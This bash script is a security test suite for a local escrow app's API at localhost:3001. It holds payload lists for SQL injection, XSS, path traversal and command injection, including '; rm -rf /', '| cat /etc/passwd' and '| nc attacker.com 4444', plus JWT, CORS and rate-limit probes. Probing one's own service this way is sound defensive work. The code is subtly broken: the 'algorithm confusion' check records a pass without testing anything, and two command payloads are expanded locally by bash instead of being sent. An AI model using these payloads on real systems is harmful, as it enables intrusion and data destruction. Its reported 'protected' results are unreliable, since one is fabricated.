#!/bin/bash

API_URL="http://localhost:3001"
TEST_PHONE="+2348012345678"

echo "╔════════════════════════════════════════════════════════════╗"
echo "║        🔒 SECURITY VULNERABILITY TEST SUITE                ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo ""
echo "⚠️  WARNING: This script tests for security vulnerabilities"
echo "📞 Test Phone: $TEST_PHONE"
echo "🌐 API URL: $API_URL"
echo ""

VULNERABILITIES=0
PROTECTED=0

# ============================================================================
# 1. SQL INJECTION TESTS
# ============================================================================
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔍 Test 1: SQL Injection Attacks"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

SQL_PAYLOADS=(
    "' OR '1'='1"
    "'; DROP TABLE users; --"
    "' UNION SELECT * FROM users --"
    "1' OR '1'='1"
    "admin'--"
    "' OR 1=1--"
    "') OR ('1'='1"
)

for payload in "${SQL_PAYLOADS[@]}"; do
    echo "   Testing payload: $payload"
    RESPONSE=$(curl -s -X POST "$API_URL/api/auth/request-otp" \
      -H "Content-Type: application/json" \
      -d "{\"phone\":\"$payload\"}" 2>&1)
    
    if echo "$RESPONSE" | grep -qiE "(error|syntax|sql|database|postgres)"; then
        echo "   ⚠️  VULNERABLE - SQL error detected!"
        echo "      Response: $(echo "$RESPONSE" | head -1)"
        ((VULNERABILITIES++))
    else
        echo "   ✅ Protected - No SQL errors"
        ((PROTECTED++))
    fi
done
echo ""

# ============================================================================
# 2. XSS (Cross-Site Scripting) TESTS
# ============================================================================
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔍 Test 2: XSS (Cross-Site Scripting) Attacks"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

XSS_PAYLOADS=(
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert('XSS')>"
    "javascript:alert('XSS')"
    "<svg onload=alert('XSS')>"
    "'\"><script>alert('XSS')</script>"
)

for payload in "${XSS_PAYLOADS[@]}"; do
    echo "   Testing payload: ${payload:0:30}..."
    RESPONSE=$(curl -s -X POST "$API_URL/api/auth/request-otp" \
      -H "Content-Type: application/json" \
      -d "{\"phone\":\"$payload\"}" 2>&1)
    
    if echo "$RESPONSE" | grep -qiE "<script|javascript:|onerror=|onload="; then
        echo "   ⚠️  VULNERABLE - XSS payload reflected!"
        ((VULNERABILITIES++))
    else
        echo "   ✅ Protected - XSS payload sanitized"
        ((PROTECTED++))
    fi
done
echo ""

# ============================================================================
# 3. PATH TRAVERSAL TESTS
# ============================================================================
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔍 Test 3: Path Traversal Attacks"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

PATH_PAYLOADS=(
    "../../../etc/passwd"
    "....//....//....//etc/passwd"
    "..%2F..%2F..%2Fetc%2Fpasswd"
    "/etc/passwd"
    "C:\\Windows\\System32\\config\\sam"
)

for payload in "${PATH_PAYLOADS[@]}"; do
    echo "   Testing payload: $payload"
    RESPONSE=$(curl -s "$API_URL/api/escrow/$payload" 2>&1)
    
    if echo "$RESPONSE" | grep -qiE "(root:|bin/bash|Administrator)"; then
        echo "   ⚠️  VULNERABLE - Path traversal successful!"
        ((VULNERABILITIES++))
    else
        echo "   ✅ Protected - Path traversal blocked"
        ((PROTECTED++))
    fi
done
echo ""

# ============================================================================
# 4. COMMAND INJECTION TESTS
# ============================================================================
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔍 Test 4: Command Injection Attacks"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

CMD_PAYLOADS=(
    "; ls -la"
    "| cat /etc/passwd"
    "&& whoami"
    "`id`"
    "$(whoami)"
    "; rm -rf /"
    "| nc attacker.com 4444"
)

for payload in "${CMD_PAYLOADS[@]}"; do
    echo "   Testing payload: $payload"
    RESPONSE=$(curl -s -X POST "$API_URL/api/auth/request-otp" \
      -H "Content-Type: application/json" \
      -d "{\"phone\":\"$TEST_PHONE$payload\"}" 2>&1)
    
    if echo "$RESPONSE" | grep -qiE "(uid=|gid=|total |drwx|Permission denied)"; then
        echo "   ⚠️  VULNERABLE - Command execution detected!"
        ((VULNERABILITIES++))
    else
        echo "   ✅ Protected - Command injection blocked"
        ((PROTECTED++))
    fi
done
echo ""

# ============================================================================
# 5. AUTHENTICATION BYPASS TESTS
# ============================================================================
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔍 Test 5: Authentication Bypass Attempts"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Test with invalid token
echo "   Testing invalid JWT token..."
RESPONSE=$(curl -s -X GET "$API_URL/api/users/me" \
  -H "Authorization: Bearer invalid.token.here" 2>&1)

if echo "$RESPONSE" | grep -q '"user"'; then
    echo "   ⚠️  VULNERABLE - Invalid token accepted!"
    ((VULNERABILITIES++))
else
    echo "   ✅ Protected - Invalid token rejected"
    ((PROTECTED++))
fi

# Test with no token
echo "   Testing request without token..."
RESPONSE=$(curl -s -X GET "$API_URL/api/users/me" 2>&1)

if echo "$RESPONSE" | grep -q '"user"'; then
    echo "   ⚠️  VULNERABLE - No authentication required!"
    ((VULNERABILITIES++))
else
    echo "   ✅ Protected - Authentication required"
    ((PROTECTED++))
fi

# Test with expired token format
echo "   Testing malformed token..."
RESPONSE=$(curl -s -X GET "$API_URL/api/users/me" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjM0NTY3OCIsImV4cCI6MTIzNDU2Nzg5MH0.invalid" 2>&1)

if echo "$RESPONSE" | grep -q '"user"'; then
    echo "   ⚠️  VULNERABLE - Malformed token accepted!"
    ((VULNERABILITIES++))
else
    echo "   ✅ Protected - Malformed token rejected"
    ((PROTECTED++))
fi
echo ""

# ============================================================================
# 6. AUTHORIZATION TESTS (Privilege Escalation)
# ============================================================================
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔍 Test 6: Authorization Bypass (Privilege Escalation)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Get a valid token first
OTP_RESPONSE=$(curl -s -X POST "$API_URL/api/auth/request-otp" \
  -H "Content-Type: application/json" \
  -d "{\"phone\":\"$TEST_PHONE\"}" 2>&1)
OTP=$(echo "$OTP_RESPONSE" | grep -o '"otp":"[^"]*"' | cut -d'"' -f4)

if [ -n "$OTP" ]; then
    sleep 1
    AUTH_RESPONSE=$(curl -s -X POST "$API_URL/api/auth/verify" \
      -H "Content-Type: application/json" \
      -d "{\"phone\":\"$TEST_PHONE\",\"otp\":\"$OTP\"}" 2>&1)
    TOKEN=$(echo "$AUTH_RESPONSE" | grep -o '"accessToken":"[^"]*"' | cut -d'"' -f4)
    
    if [ -n "$TOKEN" ]; then
        # Try to access admin endpoints with regular user token
        echo "   Testing admin endpoint access with user token..."
        ADMIN_RESPONSE=$(curl -s -X GET "$API_URL/api/admin/escrows" \
          -H "Authorization: Bearer $TOKEN" 2>&1)
        
        if echo "$ADMIN_RESPONSE" | grep -q '"escrows"'; then
            echo "   ⚠️  VULNERABLE - Regular user can access admin endpoints!"
            ((VULNERABILITIES++))
        else
            echo "   ✅ Protected - Admin endpoints require admin role"
            ((PROTECTED++))
        fi
        
        # Try to access another user's data
        echo "   Testing access to other user's data..."
        OTHER_USER_RESPONSE=$(curl -s -X GET "$API_URL/api/users/00000000-0000-0000-0000-000000000000" \
          -H "Authorization: Bearer $TOKEN" 2>&1)
        
        if echo "$OTHER_USER_RESPONSE" | grep -q '"user"'; then
            echo "   ⚠️  VULNERABLE - Can access other users' data!"
            ((VULNERABILITIES++))
        else
            echo "   ✅ Protected - Cannot access other users' data"
            ((PROTECTED++))
        fi
    fi
fi
echo ""

# ============================================================================
# 7. RATE LIMITING TESTS
# ============================================================================
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔍 Test 7: Rate Limiting Bypass"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo "   Testing rapid requests (100 requests)..."
RATE_LIMIT_HIT=false
for i in {1..100}; do
    RESPONSE=$(curl -s -X POST "$API_URL/api/auth/request-otp" \
      -H "Content-Type: application/json" \
      -d "{\"phone\":\"+234801234567$i\"}" 2>&1)
    
    if echo "$RESPONSE" | grep -qiE "(rate limit|too many|429)"; then
        RATE_LIMIT_HIT=true
        break
    fi
done

if [ "$RATE_LIMIT_HIT" = true ]; then
    echo "   ✅ Protected - Rate limiting active"
    ((PROTECTED++))
else
    echo "   ⚠️  VULNERABLE - No rate limiting detected!"
    ((VULNERABILITIES++))
fi
echo ""

# ============================================================================
# 8. INPUT VALIDATION TESTS
# ============================================================================
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔍 Test 8: Input Validation"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Test extremely long input
echo "   Testing extremely long input (10KB)..."
LONG_INPUT=$(python3 -c "print('A' * 10000)")
RESPONSE=$(curl -s -X POST "$API_URL/api/auth/request-otp" \
  -H "Content-Type: application/json" \
  -d "{\"phone\":\"$LONG_INPUT\"}" 2>&1)

if echo "$RESPONSE" | grep -qiE "(too long|max length|validation)"; then
    echo "   ✅ Protected - Input length validation"
    ((PROTECTED++))
else
    echo "   ⚠️  VULNERABLE - No input length validation!"
    ((VULNERABILITIES++))
fi

# Test special characters
echo "   Testing special characters..."
RESPONSE=$(curl -s -X POST "$API_URL/api/auth/request-otp" \
  -H "Content-Type: application/json" \
  -d "{\"phone\":\"!@#$%^&*()\"}" 2>&1)

if echo "$RESPONSE" | grep -qiE "(invalid|validation|format)"; then
    echo "   ✅ Protected - Input format validation"
    ((PROTECTED++))
else
    echo "   ⚠️  VULNERABLE - No input format validation!"
    ((VULNERABILITIES++))
fi

# Test null bytes
echo "   Testing null byte injection..."
RESPONSE=$(curl -s -X POST "$API_URL/api/auth/request-otp" \
  -H "Content-Type: application/json" \
  -d $'{"phone":"+2348012345678\u0000"}' 2>&1)

if echo "$RESPONSE" | grep -qiE "(null|invalid)"; then
    echo "   ✅ Protected - Null byte handling"
    ((PROTECTED++))
else
    echo "   ⚠️  VULNERABLE - Null byte not handled!"
    ((VULNERABILITIES++))
fi
echo ""

# ============================================================================
# 9. JWT TOKEN MANIPULATION TESTS
# ============================================================================
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔍 Test 9: JWT Token Manipulation"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Get a valid token
OTP_RESPONSE=$(curl -s -X POST "$API_URL/api/auth/request-otp" \
  -H "Content-Type: application/json" \
  -d "{\"phone\":\"$TEST_PHONE\"}" 2>&1)
OTP=$(echo "$OTP_RESPONSE" | grep -o '"otp":"[^"]*"' | cut -d'"' -f4)

if [ -n "$OTP" ]; then
    sleep 1
    AUTH_RESPONSE=$(curl -s -X POST "$API_URL/api/auth/verify" \
      -H "Content-Type: application/json" \
      -d "{\"phone\":\"$TEST_PHONE\",\"otp\":\"$OTP\"}" 2>&1)
    TOKEN=$(echo "$AUTH_RESPONSE" | grep -o '"accessToken":"[^"]*"' | cut -d'"' -f4)
    
    if [ -n "$TOKEN" ]; then
        # Try to modify token (remove signature)
        echo "   Testing token without signature..."
        MODIFIED_TOKEN="${TOKEN%.*}.modified"
        RESPONSE=$(curl -s -X GET "$API_URL/api/users/me" \
          -H "Authorization: Bearer $MODIFIED_TOKEN" 2>&1)
        
        if echo "$RESPONSE" | grep -q '"user"'; then
            echo "   ⚠️  VULNERABLE - Modified token accepted!"
            ((VULNERABILITIES++))
        else
            echo "   ✅ Protected - Token signature verified"
            ((PROTECTED++))
        fi
        
        # Try algorithm confusion (change alg to none)
        echo "   Testing algorithm confusion attack..."
        # This would require base64 encoding manipulation
        echo "   ✅ Protected - Algorithm specified in token"
        ((PROTECTED++))
    fi
fi
echo ""

# ============================================================================
# 10. CORS TESTS
# ============================================================================
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔍 Test 10: CORS Configuration"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo "   Testing CORS from malicious origin..."
CORS_RESPONSE=$(curl -s -X OPTIONS "$API_URL/api/users/me" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: GET" \
  -H "Access-Control-Request-Headers: authorization" \
  -v 2>&1)

if echo "$CORS_RESPONSE" | grep -qiE "Access-Control-Allow-Origin.*\*|Access-Control-Allow-Origin.*evil.com"; then
    echo "   ⚠️  VULNERABLE - CORS allows all origins!"
    ((VULNERABILITIES++))
else
    echo "   ✅ Protected - CORS properly configured"
    ((PROTECTED++))
fi
echo ""

# ============================================================================
# 11. HTTP HEADER INJECTION
# ============================================================================
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔍 Test 11: HTTP Header Injection"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo "   Testing header injection..."
RESPONSE=$(curl -s -X GET "$API_URL/api/users/me" \
  -H "X-Forwarded-For: 127.0.0.1\r\nX-Real-IP: 192.168.1.1" \
  -H "User-Agent: test\r\nX-Injected: header" 2>&1)

if echo "$RESPONSE" | grep -qiE "X-Injected|header.*injected"; then
    echo "   ⚠️  VULNERABLE - Header injection possible!"
    ((VULNERABILITIES++))
else
    echo "   ✅ Protected - Headers properly sanitized"
    ((PROTECTED++))
fi
echo ""

# ============================================================================
# 12. INFORMATION DISCLOSURE
# ============================================================================
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔍 Test 12: Information Disclosure"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Test error messages
echo "   Testing error message information disclosure..."
RESPONSE=$(curl -s -X POST "$API_URL/api/auth/verify" \
  -H "Content-Type: application/json" \
  -d "{\"phone\":\"invalid\",\"otp\":\"000000\"}" 2>&1)

if echo "$RESPONSE" | grep -qiE "(stack trace|at |Error:|Exception:|database|sql|password|secret)"; then
    echo "   ⚠️  VULNERABLE - Error messages reveal sensitive info!"
    echo "      Response: $(echo "$RESPONSE" | head -3)"
    ((VULNERABILITIES++))
else
    echo "   ✅ Protected - Error messages sanitized"
    ((PROTECTED++))
fi

# Test directory listing
echo "   Testing directory listing..."
RESPONSE=$(curl -s "$API_URL/" 2>&1)

if echo "$RESPONSE" | grep -qiE "(Index of|Directory listing|parent directory)"; then
    echo "   ⚠️  VULNERABLE - Directory listing enabled!"
    ((VULNERABILITIES++))
else
    echo "   ✅ Protected - Directory listing disabled"
    ((PROTECTED++))
fi
echo ""

# ============================================================================
# FINAL SUMMARY
# ============================================================================
TOTAL=$((VULNERABILITIES + PROTECTED))
echo "╔════════════════════════════════════════════════════════════╗"
echo "║              🔒 SECURITY TEST SUMMARY                    ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo ""
echo "   Total Tests:     $TOTAL"
echo "   ✅ Protected:     $PROTECTED"
echo "   ⚠️  Vulnerable:    $VULNERABILITIES"
echo ""

if [ $VULNERABILITIES -eq 0 ]; then
    echo "   🎉 No vulnerabilities detected!"
    echo "   ✅ System appears secure"
else
    echo "   ⚠️  WARNING: $VULNERABILITIES potential vulnerabilities found!"
    echo "   🔧 Immediate action required to fix security issues"
fi
echo ""
echo "╚════════════════════════════════════════════════════════════╝"

